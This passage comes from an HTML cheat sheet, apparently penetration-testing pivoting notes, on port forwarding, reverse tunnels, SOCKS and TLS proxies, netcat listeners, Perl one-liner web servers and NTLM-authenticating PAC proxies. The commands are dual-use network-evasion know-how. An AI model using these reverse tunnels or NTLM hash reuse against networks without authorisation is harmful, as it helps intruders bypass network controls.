graftcp <span class="nt">-n</span> &lt;<span class="nb">command</span><span class="o">&gt;</span></code></pre></div></div></li> </ul> </li> </ul> <h4 id="port-redirection--socks---dynamic--tunnel-usage--proxychains"> <a href="#port-redirection--socks---dynamic--tunnel-usage--proxychains" class="anchor-heading" aria-labelledby="port-redirection--socks---dynamic--tunnel-usage--proxychains"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> ProxyChains </h4> <ul> <li>Hack based on <code>LD_PRELOAD</code> (linux)</li> <li>Modify the last line of <code>proxychains.conf</code> to use the 1080 port, also check if using socks4 vs socks5</li> <li>You may want to uncomment <code>quiet_mode</code></li> <li>Use is as follow:<div class="language-bat highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">:: Python pip works</span>
<span class="kd">proxychains_win32_x86</span><span class="err">.exe</span> <span class="na">-f </span><span class="kd">proxychains</span>.conf <span class="o">&lt;</span><span class="kd">program</span><span class="o">&gt;</span></code></pre></div></div></li> </ul> <h4 id="port-redirection--socks---dynamic--tunnel-usage--browser"> <a href="#port-redirection--socks---dynamic--tunnel-usage--browser" class="anchor-heading" aria-labelledby="port-redirection--socks---dynamic--tunnel-usage--browser"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Browser </h4> <ul> <li>Unfortunately neither IE nor Edge seem to like the proxy settings, the only alternative appears to be downloading <a href="https://portableapps.com/redirect/?a=FirefoxPortable&amp;s=s&amp;d=pa&amp;f=FirefoxPortable_87.0_English.paf.exe">Firefox Portable</a> and configure to use the socks5 proxy</li> </ul> <h2 id="port-redirection--individual-ports"> <a href="#port-redirection--individual-ports" class="anchor-heading" aria-labelledby="port-redirection--individual-ports"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Individual Ports </h2> <h3 id="port-redirection--individual-ports--gost"> <a href="#port-redirection--individual-ports--gost" class="anchor-heading" aria-labelledby="port-redirection--individual-ports--gost"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Gost </h3> <h4 id="port-redirection--individual-ports--gost--ssh"> <a href="#port-redirection--individual-ports--gost--ssh" class="anchor-heading" aria-labelledby="port-redirection--individual-ports--gost--ssh"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> SSH </h4> <ul> <li><a href="https://docs.ginuerzh.xyz/gost/en/port-forwarding/#ssh-port-forwarding-mode">Docs</a> - <a href="https://docs.ginuerzh.xyz/gost/en/ssh/#pubkey-authentication-211">Auth</a></li> <li>Note: <code>forward</code> mode <b>only supports TCP</b></li> <li>Forward TCP - SSH native:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Server</span>
gost <span class="nt">-L</span> forward+ssh://:2222

<span class="c"># Client</span>
gost <span class="nt">-L</span> tcp://127.0.0.1:8080/:80 <span class="nt">-F</span> forward+ssh://&lt;ip&gt;:2222?ping<span class="o">=</span>60</code></pre></div></div></li> <li>Reverse UDP - SSH encapsulated:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Server -&gt; will be the client</span>
gost <span class="nt">-L</span> ssh://:2222

<span class="c"># Client -&gt; will be the server</span>
gost <span class="nt">-L</span> rudp://:5353/&lt;dns-ip&gt;:53 <span class="nt">-F</span> ssh://&lt;ip&gt;:2222?ping<span class="o">=</span>60
<span class="c"># Ignore the log about SOCKS</span></code></pre></div></div></li> </ul> <h4 id="port-redirection--individual-ports--gost--simple-tcp-udp-redirection---direct"> <a href="#port-redirection--individual-ports--gost--simple-tcp-udp-redirection---direct" class="anchor-heading" aria-labelledby="port-redirection--individual-ports--gost--simple-tcp-udp-redirection---direct"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Simple TCP/UDP Redirection - Direct </h4> <ul> <li><a href="https://docs.ginuerzh.xyz/gost/en/port-forwarding/#local-tcp-port-forwarding">Docs</a></li> <li>Forward TCP:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gost <span class="nt">-L</span> tcp://127.0.0.1:3333/&lt;ip&gt;:1212</code></pre></div></div></li> <li>Reverse UDP:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Reverse requires a proxy listening</span>
gost <span class="nt">-L</span> rudp://:5353/&lt;dns-ip&gt;:53 <span class="nt">-F</span> &lt;ip&gt;:3355</code></pre></div></div></li> <li>Forward Tunnel over TLS:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Server</span>
gost <span class="nt">-L</span> tls://:8443/&lt;target-ip&gt;:80

<span class="c"># Client</span>
gost <span class="nt">-L</span> tcp://:8080 <span class="nt">-F</span> forward+tls://:8443
<span class="c"># Connect to client</span></code></pre></div></div></li> </ul> <h4 id="port-redirection--individual-ports--gost--multiple-tcp-udp-redirection---relay"> <a href="#port-redirection--individual-ports--gost--multiple-tcp-udp-redirection---relay" class="anchor-heading" aria-labelledby="port-redirection--individual-ports--gost--multiple-tcp-udp-redirection---relay"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Multiple TCP/UDP Redirection - Relay </h4> <ul> <li><a href="https://docs.ginuerzh.xyz/gost/relay/">Docs</a></li> <li>Only port-forwarding/tunneling is supported (but you can bypass this with a reverse-tunnel + SOCKS5 wrap)</li> <li>Port forwarding:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Server</span>
gost <span class="nt">-L</span> relay://:9999

<span class="c"># Client</span>
gost <span class="nt">-L</span> udp://:5353/&lt;dns&gt;:53 <span class="nt">-L</span> tcp://:8080/:80 <span class="nt">-F</span> relay://&lt;ip&gt;:9999?nodelay<span class="o">=</span><span class="nb">true</span>
<span class="c"># UDP: C 5353 -&gt; S 9999 -&gt; &lt;dns&gt;:53</span>
<span class="c"># TCP: C 8080 -&gt; S 9999 -&gt; S 80</span></code></pre></div></div></li> <li>Forward tunnel:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Server</span>
gost <span class="nt">-L</span> relay://:9999/&lt;dns&gt;:53

<span class="c"># Client</span>
gost <span class="nt">-L</span> udp://:5353 <span class="nt">-L</span> tcp://:8080 <span class="nt">-F</span> relay://&lt;ip&gt;:9999?nodelay<span class="o">=</span><span class="nb">true</span>
<span class="c"># UDP: C 5353 -&gt; S 9999 -&gt; &lt;dns&gt;:53</span>
<span class="c"># TCP: C 8080 -&gt; S 9999 -&gt; &lt;dns&gt;:53</span></code></pre></div></div></li> <li>The <code>nodelay</code> flag (default <code>false</code>) will only relay the connection to the server if data is received from the client</li> <li>This means that simple port-pinging or connection won&#8217;t be transparently relayed unless the flag is <code>true</code></li> </ul> <h3 id="port-redirection--individual-ports--mr2"> <a href="#port-redirection--individual-ports--mr2" class="anchor-heading" aria-labelledby="port-redirection--individual-ports--mr2"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> mr2 </h3> <ul> <li><a href="https://github.com/txthinking/mr2/releases">Binaries</a></li> <li><a href="https://github.com/txthinking/mr2#server-and-client">Usage</a> - Reverse port forwarding:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Server</span>
mr2 server <span class="nt">-l</span> :9999 <span class="nt">-p</span> password

<span class="c"># Client</span>
mr2 client <span class="nt">-s</span> &lt;ip&gt;:9999 <span class="nt">-p</span> password <span class="nt">-P</span> 8888 <span class="nt">-c</span> 127.0.0.1:8080
<span class="c"># Server's port 8888 redirect to</span>
<span class="c"># client's 8080</span></code></pre></div></div></li> <li>Reverse directory listing:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Server</span>
mr2 server <span class="nt">-l</span> :9999 <span class="nt">-p</span> password

<span class="c"># Client</span>
mr2 client <span class="nt">-s</span> &lt;ip&gt;:9999 <span class="nt">-p</span> password <span class="nt">-P</span> 8888 <span class="nt">--clientPort</span> 8080 <span class="nt">--clientDirectory</span> &lt;path&gt;
<span class="c"># &lt;path&gt; will be accessible over</span>
<span class="c"># server's 8888</span></code></pre></div></div></li> </ul> <h3 id="port-redirection--individual-ports--socat"> <a href="#port-redirection--individual-ports--socat" class="anchor-heading" aria-labelledby="port-redirection--individual-ports--socat"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Socat </h3> <ul> <li>Forward redirection (<a href="https://stackoverflow.com/a/31194939">ref1</a>, <a href="https://serverfault.com/a/407382">ref 2</a>):<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Local 8080 redirected to &lt;ip&gt;:80</span>
socat TCP-LISTEN:8080 TCP:&lt;ip&gt;:80

<span class="c"># With DNS forwarding</span>
socat TCP-LISTEN:8080,fork SOCKS4A:127.0.0.1:&lt;ip&gt;:80,socksport<span class="o">=</span>5678</code></pre></div></div></li> </ul> <h3 id="port-redirection--individual-ports--plink-exe"> <a href="#port-redirection--individual-ports--plink-exe" class="anchor-heading" aria-labelledby="port-redirection--individual-ports--plink-exe"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> PLINK.exe </h3> <ul> <li>Reverse redirection:<div class="language-bat highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">plink</span><span class="err">.exe</span> <span class="na">-ssh -N -l </span><span class="o">&lt;</span><span class="kd">user</span><span class="o">&gt;</span> <span class="na">-pw </span><span class="o">&lt;</span><span class="kd">pass</span><span class="o">&gt;</span> <span class="na">-R </span><span class="m">192</span>.168.1.1:1212:127.0.0.1:6000 <span class="m">192</span>.168.1.1 <span class="o">&lt;</span><span class="kd">user</span><span class="o">&gt;</span>@&lt;host&gt;</code></pre></div></div></li> </ul> <h3 id="port-redirection--individual-ports--rinetd"> <a href="#port-redirection--individual-ports--rinetd" class="anchor-heading" aria-labelledby="port-redirection--individual-ports--rinetd"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Rinetd </h3> <ul> <li><a href="https://github.com/samhocevar/rinetd">Project</a></li> <li>Create the configuration (<code>rinetd.conf</code>):<div class="language-conf highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># lhost lport rhost rport
</span>&lt;<span class="n">lip</span>&gt;   <span class="m">80</span>    &lt;<span class="n">rip</span>&gt; <span class="m">80</span></code></pre></div></div></li> <li>Start in the foreground:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rinetd <span class="nt">-f</span> <span class="nt">-c</span> rinetd.conf</code></pre></div></div></li> </ul> <h2 id="port-redirection--http-proxy"> <a href="#port-redirection--http-proxy" class="anchor-heading" aria-labelledby="port-redirection--http-proxy"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> HTTP Proxy </h2> <h3 id="port-redirection--http-proxy--gost"> <a href="#port-redirection--http-proxy--gost" class="anchor-heading" aria-labelledby="port-redirection--http-proxy--gost"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Gost </h3> <ul> <li><a href="https://docs.ginuerzh.xyz/gost/en/http/">Simple HTTP(S)</a> or <a href="https://docs.ginuerzh.xyz/gost/en/http2/">HTTP2</a>:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># HTTP</span>
gost <span class="nt">-L</span> http://:8080

<span class="c"># HTTPS</span>
gost <span class="nt">-L</span> https://:8080

<span class="c"># HTTP2</span>
gost <span class="nt">-L</span> http2://:8080

<span class="c"># HTTP 1.1 to HTTP 2.0</span>
gost <span class="nt">-L</span> http://:8080 <span class="nt">-F</span> http2://:9090 <span class="nt">--</span> <span class="nt">-L</span> http2://:9090
<span class="c"># http &amp; ohttp -&gt; HTTP 1.1 transports</span>
<span class="c"># h2c  &amp; h2    -&gt; HTTP 2.0 transports</span></code></pre></div></div></li> <li><a href="https://docs.ginuerzh.xyz/gost/en/port-forwarding/#forward-tunnel">TLS to SNI forwarding</a>:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Server</span>
gost <span class="nt">-L</span> tls://:4433/:3344 <span class="nt">-L</span> sni://:3344
<span class="c"># SNI is a TLS extension to specify</span>
<span class="c"># the target domain to the server</span>

<span class="c"># Client</span>
gost <span class="nt">-L</span> :8080 <span class="nt">-F</span> forward+tls://&lt;ip&gt;:4433</code></pre></div></div></li> <li><a href="https://docs.ginuerzh.xyz/gost/relay">Relay HTTP/SOCKS</a>:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Server</span>
gost <span class="nt">-L</span> relay+tls://:1080

<span class="c"># Client</span>
gost <span class="nt">-L</span> :8080 <span class="nt">-F</span> relay+tls://&lt;ip&gt;:1080?nodelay<span class="o">=</span><span class="nb">false</span></code></pre></div></div></li> <li>Proxy Usage - Curl:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-s</span> <span class="nt">-x</span> http://127.0.0.1:8080 <span class="nt">-L</span> https://&lt;site&gt; | w3m <span class="nt">-T</span> text/html</code></pre></div></div></li> </ul> <h3 id="port-redirection--http-proxy--netsh"> <a href="#port-redirection--http-proxy--netsh" class="anchor-heading" aria-labelledby="port-redirection--http-proxy--netsh"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Netsh </h3> <ul> <li><a href="https://andykdocs.de/development/Windows/Proxy+Configuration+via+Command+Line">How to</a></li> </ul> <h2 id="port-redirection--ssl---tls-proxy"> <a href="#port-redirection--ssl---tls-proxy" class="anchor-heading" aria-labelledby="port-redirection--ssl---tls-proxy"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> SSL / TLS Proxy </h2> <h3 id="port-redirection--ssl---tls-proxy--gost"> <a href="#port-redirection--ssl---tls-proxy--gost" class="anchor-heading" aria-labelledby="port-redirection--ssl---tls-proxy--gost"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Gost </h3> <ul> <li>Strip TLS from incoming traffic:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gost <span class="nt">-L</span> tls://127.0.0.1:4433/127.0.0.1:8080

<span class="c"># Test it with a netcat listener:</span>
<span class="nb">echo</span> <span class="nt">-ne</span> <span class="s1">'HTTP/1.0 404\r\nContent-Length: 0\r\n\r\n'</span> | nc <span class="nt">-lnvp</span> 8080

<span class="c"># And curl connecting via HTTPS</span>
curl <span class="nt">-i</span> <span class="nt">-k</span> https://127.0.0.1:4433</code></pre></div></div></li> <li>Add TLS to outgoing traffic:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># The response includes a CONNECT header</span>
gost <span class="nt">-L</span> tcp://127.0.0.1:8080/127.0.0.1:8008 <span class="nt">-L</span> tcp://127.0.0.1:8008 <span class="nt">-F</span> tls://127.0.0.1:4433

<span class="c"># Test it with a netcat listener:</span>
nc <span class="nt">-lnvp</span> 4433

<span class="c"># And curl connecting via HTTP</span>
curl http://127.0.0.1:8080

<span class="c"># Decode it back:</span>
gost <span class="nt">-L</span> tls://127.0.0.1:4433 <span class="nt">-F</span> sni://127.0.0.1:8888</code></pre></div></div></li> </ul> <h3 id="port-redirection--ssl---tls-proxy--stunnel"> <a href="#port-redirection--ssl---tls-proxy--stunnel" class="anchor-heading" aria-labelledby="port-redirection--ssl---tls-proxy--stunnel"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> stunnel </h3> <ul> <li><a href="https://www.stunnel.org/howto.html">Site</a> - Add SSL/TLS to local HTTP services<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Note that gost should also work</span>

<span class="c"># Useful for making php -S HTTPS</span>
php <span class="nt">-S</span> 127.0.0.1:8080 &amp;

<span class="c"># Generate a cert</span>
openssl req <span class="nt">-new</span> <span class="nt">-x509</span> <span class="nt">-days</span> 365 <span class="nt">-nodes</span> <span class="nt">-out</span> crt.pem <span class="nt">-keyout</span> crt.pem <span class="nt">-batch</span>

<span class="c"># Add HTTPS on 4433 IPv4</span>
stunnel3 <span class="nt">-d</span> 0.0.0.0:4433 <span class="nt">-r</span> 8080 <span class="nt">-f</span> <span class="nt">-p</span> crt.pem <span class="nt">-P</span> /tmp/.stunnel.pid
<span class="c"># -P &lt;path&gt; is needed for non-root</span></code></pre></div></div></li> </ul> <h2 id="port-redirection--listeners"> <a href="#port-redirection--listeners" class="anchor-heading" aria-labelledby="port-redirection--listeners"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Listeners </h2> <h3 id="port-redirection--listeners--authbind"> <a href="#port-redirection--listeners--authbind" class="anchor-heading" aria-labelledby="port-redirection--listeners--authbind"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Authbind </h3> <ul> <li><a href="https://www.chiark.greenend.org.uk/ucgi/~ian/git/authbind.git/">Site</a> - Bind &lt; 1024 ports as non-root:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Netcat bind in port 80 as non-root</span>
authbind nc <span class="nt">-lnvp</span> 80</code></pre></div></div></li> </ul> <h1 id="web-servers---proxies"> <a href="#web-servers---proxies" class="anchor-heading" aria-labelledby="web-servers---proxies"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Web Servers &amp; Proxies </h1> <h2 id="web-servers---proxies--http"> <a href="#web-servers---proxies--http" class="anchor-heading" aria-labelledby="web-servers---proxies--http"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> HTTP </h2> <h3 id="web-servers---proxies--http--perl"> <a href="#web-servers---proxies--http--perl" class="anchor-heading" aria-labelledby="web-servers---proxies--http--perl"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Perl </h3> <ul> <li>Core Perl listeners - Return 404:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Connection timeout set to 5 seconds</span>
<span class="c"># Localhost only, listens to 80 and 443</span>
perl <span class="nt">-le</span> <span class="s1">'$SIG{CHLD}=IGNORE;$"=",pack+";$p=fork//die?80:443;socket+S,2,1,6;eval"setsockopt+S,@$_"for["1,2","l,1"],["1,13","ii,1,5"],["1,21",q/"l!2",5/],["6,18","L,5000"];bind+S,pack+snsnN2,2,$p,127,1;listen+S,1;close$;while(accept$;,S),fork//1;print$;("HTTP/1.0 404\r\nContent-Length: 0\r\n\r")'</span>
<span class="c"># The first socket call is equivalent to:</span>
<span class="c">#   socket$s,PF_INET,SOCK_STREAM,</span>
<span class="c">#            getprotobyname("tcp")</span>
<span class="c"># Packed arrays structure:</span>
<span class="c"># [ &lt;Sock-Level&gt;, &lt;Level-Opt&gt;, &lt;Rest*&gt; ]</span>
<span class="c"># Sock-Level 1 -&gt; SOL_SOCKET</span>
<span class="c">#   Level-Opt 2  -&gt; SO_REUSEADDR</span>
<span class="c">#   Level-Opt 13 -&gt; SO_LINGER</span>
<span class="c">#   Level-Opt 21 -&gt; SO_SNDTIMEO</span>
<span class="c">#   See man socket7, asm-generic/socket.h</span>
<span class="c"># Sock-Level 6 -&gt; getprotobyname("tcp")</span>
<span class="c">#              or Socket::IPPROTO_TCP</span>
<span class="c">#   Level-Opt 18 Socket::TCP_USER_TIMEOUT</span>
<span class="c">#   See man tcp7 &amp; ip7, and linux/tcp.h</span>

<span class="c"># See if the socket options are set</span>
perl <span class="nt">-E</span> <span class="s1">'$"=",pack+";$,=" ";socket$s,2,1,6;map{eval"setsockopt\$s,@$_;say unpack\"(H2)*\",getsockopt\$s,$$_[0]"}["1,2","l,1"],["1,13","ii,1,5"],["1,21",q/"l!2",5/],["6,18","L,5000"]'</span>

<span class="c"># Minimal on 0.0.0.0, no timeout nor reuse</span>
<span class="c"># Causes errors on the clients</span>
perl <span class="nt">-e</span> <span class="s1">'$SIG{CHLD}=IGNORE;$_=fork//die?80:443;socket+S,2,1,6;bind+S,pack+sn7,2,$_;listen+S,1;close$;while(accept$;,S),fork//1;shutdown$;,2'</span>
<span class="c"># shutdown results in "Empty reply" error</span>
<span class="c"># Remove shutdown for "Connection reset"</span>

<span class="c"># The pack magic comes from this</span>
perl <span class="nt">-MSocket</span> <span class="nt">-E</span> <span class="s1">'$,=" ";say+unpack"(H2)*",sockaddr_in+8888,127.0.0.1'</span>
<span class="c"># ^ using pack with hex-encoded addr is:</span>
perl <span class="nt">-E</span> <span class="s1">'say join" ",unpack"(H2)*",pack+snN3,2,8888,0x7f000001'</span>
<span class="c"># Or compacted:</span>
perl <span class="nt">-E</span> <span class="s1">'say join" ",unpack"(H2)*",pack"(sn)4",2,8888,127,1'</span>
<span class="c"># Or full IP - comma delimited:</span>
perl <span class="nt">-E</span> <span class="s1">'say join" ",unpack"(H2)*",pack+snC12,2,8888,192,168,1,1'</span>
<span class="c"># Or full IP - v-string (not portable):</span>
perl <span class="nt">-E</span> <span class="s1">'say join" ",unpack"(H2)*",pack+sna12,2,8888,127.0.0.1'</span>
<span class="c"># Or full IP - v-string (portable):</span>
perl <span class="nt">-E</span> <span class="s1">'say join" ",unpack"(H2)*",pack+snN3,2,8888,unpack+N,127.0.0.1'</span></code></pre></div></div></li> <li>Core Perl Webserver - HTTP/1.1 Keep-alive:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Serves from current dir - To serve from /</span>
<span class="c">#  $_=".$1" -&gt; $_=-d$1?"$1/index.html":$1</span>
perl <span class="nt">-e</span> <span class="s1">'$SIG{CHLD}=IGNORE;$"=",\$f=pack+";socket+S,2,1,6;eval"setsockopt+S,@$_"for["1,2","l,1"],["1,13","ii,1,5"],["6,1","l,1"],["6,18","L,5000"],["1,21",q/"l!2",5/];bind+S,pack+snN3,2,&lt;PORT&gt;,unpack+N,&lt;IP&gt;;listen+S,5;$/="\r\n"x2;close$:while(accept$:,S),fork//1;setsockopt$:,1,20,$f;$_=".$1",$f=2&lt;&lt;14,map{send$:,$_,$f}"HTTP/1.1 ",open(F,"&lt;",-d?$_.="/index.html":$_)?200:404,"\r\nContent-Type: ",'</span><span class="s2">"</span><span class="si">$(</span>perl <span class="nt">-MSocket</span> <span class="nt">-e</span> <span class="s1">'$"=",pack+";socket+S,2,1,6;eval"setsockopt+S,@$_"for["1,13","ii,1,5"],["6,18","L,5000"],map["1,2$_",q/"l!2",5/],0,1;connect+S,sockaddr_in+80,inet_aton$_="svn.apache.org";$/="\r\n"x2;send+S,"GET /viewvc/httpd/httpd/trunk/docs/conf/mime.types?view=co HTTP/1.0\r\nHost: $_$/",0;&lt;S&gt;;$_=&lt;S&gt;;y/ /|/;s!^([^#]+?)\s+(.+)!print"/\\.($2)\$/n?\"$1\":"!gem'</span><span class="si">)</span><span class="s2">"</span><span class="s1">'"application/octet-stream","\r\nContent-Length: ",0+-s,$/,&lt;F&gt;,$f=()while&lt;$:&gt;=~/\s([^\s?]+)/'</span>
<span class="c"># Allows dir traversal - Fix it with:</span>
<span class="c">#   &lt;$:&gt;=~/\s((?:(?!\.\.)[^\s?])+)/</span>
<span class="c">#</span>
<span class="c"># Opts in addition to those explained above</span>
<span class="c"># Sock-Level 1 -&gt; SOL_SOCKET</span>
<span class="c">#   Level-Opt 20 -&gt; SO_RCVTIMEO</span>
<span class="c"># Sock-Level 6 -&gt; getprotobyname("tcp")</span>
<span class="c">#   Level-Opt 1 -&gt; TCP_NODELAY</span>
<span class="c"># send flag (send(2) - bits/socket.h)</span>
<span class="c">#   MSG_MORE -&gt; 0x8000 -&gt; 2&lt;&lt;14</span>

<span class="c"># Hash version - Highest performance</span>
perl <span class="nt">-e</span> <span class="s1">'$SIG{CHLD}=IGNORE;%m=("'</span><span class="si">$(</span>perl <span class="nt">-MSocket</span> <span class="nt">-e</span> <span class="s1">'$"=",pack+";socket+S,2,1,6;eval"setsockopt+S,@$_"for["1,13","ii,1,5"],["6,18","L,5000"],map["1,2$_",q/"l!2",5/],0,1;connect+S,sockaddr_in+80,inet_aton$_="svn.apache.org";{local$/="\r\n"x2;send+S,"GET /viewvc/httpd/httpd/trunk/docs/conf/mime.types?view=co HTTP/1.0\r\nHost: $_$/",0;&lt;S&gt;}($_,@_)=split,$,=qq/","$_","/,/^#/||print@_,""while&lt;S&gt;'</span><span class="si">)</span><span class="s1">'");$"=",\$d=pack+";socket+S,2,1,6;eval"setsockopt+S,@$_"for["1,2","l,1"],["1,13","ii,1,5"],["6,1","L,1"],["6,18","L,5000"],["1,21",q/"l!2",5/];bind+S,pack+snN3,2,&lt;PORT&gt;,unpack+N,'</span><span class="si">$(</span><span class="nb">hostname</span> <span class="nt">-i</span><span class="si">)</span><span class="s1">';listen+S,5;$/="\r\n"x2;$f=2&lt;&lt;14;close$:while(accept$:,S),fork//1;setsockopt$:,1,20,$d;$_=".$&amp;",$d=$f,map{send$:,$_,$d}"HTTP/1.1 ",open(F,"&lt;",-d?$_.="/index.html":$_)?200:404,"\r\nContent-Type: ",$m{s/.+\.//r}//"application/octet-stream","\r\nContent-Length: ",0+-s,$/,&lt;F&gt;,$d=()while&lt;$:&gt;=~/\s([^\s?]+)/'</span>
<span class="c"># If no internet or no Socket module, use</span>
<span class="nb">awk</span> <span class="s1">'/^.$/,0{if(!/^#/&amp;&amp;$2){gsub(" ","|");printf"/\\.(%s)$/?\"%s\":",$2,$1}}'</span> mime.types
<span class="c"># In the command substitution with:</span>
<span class="c"># http://svn.apache.org/viewvc/httpd/httpd/trunk/docs/conf/mime.types?view=co</span></code></pre></div></div></li> </ul> <h2 id="web-servers---proxies--wpad-pac---ntlm"> <a href="#web-servers---proxies--wpad-pac---ntlm" class="anchor-heading" aria-labelledby="web-servers---proxies--wpad-pac---ntlm"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> WPAD/PAC &amp; NTLM </h2> <h3 id="web-servers---proxies--wpad-pac---ntlm--depac"> <a href="#web-servers---proxies--wpad-pac---ntlm--depac" class="anchor-heading" aria-labelledby="web-servers---proxies--wpad-pac---ntlm--depac"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> dePAC </h3> <ul> <li><a href="https://github.com/creaktive/dePAC">Site</a> (<a href="https://raw.githubusercontent.com/creaktive/dePAC/master/depac">raw</a>) - Native Perl PAC proxy<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Backgrounds by default -&gt; depac --stop</span>
perl depac <span class="nt">--wpad_file</span> &lt;url/file&gt; <span class="nt">--bind_port</span> 8080 <span class="nt">--log_file</span> /dev/null
<span class="c"># Add 127.0.0.1 to the dnsResolve func</span>
<span class="c"># as return string instead of ()</span>
<span class="c"># Start a Perl server listening to 80/443</span></code></pre></div></div></li> </ul> <h3 id="web-servers---proxies--wpad-pac---ntlm--pacproxy"> <a href="#web-servers---proxies--wpad-pac---ntlm--pacproxy" class="anchor-heading" aria-labelledby="web-servers---proxies--wpad-pac---ntlm--pacproxy"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> pacproxy </h3> <ul> <li><a href="https://github.com/williambailey/pacproxy">Site</a> - Go PAC proxy with binaries<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Able to directly parse JS</span>
pacproxy <span class="nt">-c</span> &lt;url/file/js&gt; <span class="o">[</span><span class="nt">-l</span>&lt;host:port&gt;]
<span class="c"># -l defaults to 127.0.0.1:8080</span></code></pre></div></div></li> </ul> <h3 id="web-servers---proxies--wpad-pac---ntlm--alpaca"> <a href="#web-servers---proxies--wpad-pac---ntlm--alpaca" class="anchor-heading" aria-labelledby="web-servers---proxies--wpad-pac---ntlm--alpaca"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> alpaca </h3> <ul> <li><a href="https://github.com/samuong/alpaca">Site</a> - Go PAC proxy supporting NTLM auth<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Use a PAC file, default listen on 3128</span>
alpaca <span class="nt">-C</span> &lt;uri&gt; <span class="nt">-d</span> &lt;port&gt;
<span class="c"># Use file:///&lt;path&gt; for local file</span>

<span class="c"># NTLM - Asks for credentials by default</span>
alpaca <span class="nt">-d</span> &lt;domain&gt; <span class="nt">-u</span> &lt;user&gt; <span class="o">[</span><span class="nt">-H</span><span class="o">]</span>
<span class="c"># -H - Generate NTLM hash for the creds</span>

<span class="c"># Export the creds to auto-authenticate</span>
<span class="nb">export </span><span class="nv">NTLM_CREDENTIALS</span><span class="o">=</span><span class="s2">"&lt;NTLM-hash&gt;"</span>
alpaca <span class="nt">-C</span> &lt;pac&gt; <span class="nt">-d</span> &lt;dom&gt; <span class="nt">-u</span> &lt;usr&gt;</code></pre></div></div></li> </ul> <h3 id="web-servers---proxies--wpad-pac---ntlm--paxy"> <a href="#web-servers---proxies--wpad-pac---ntlm--paxy" class="anchor-heading" aria-labelledby="web-servers---proxies--wpad-pac---ntlm--paxy"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> paxy </h3> <ul> <li><a href="https://github.com/robbiemcmichael/paxy">Site</a> - Simple Go PAC proxy<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># It also servers the PAC in /pac</span>
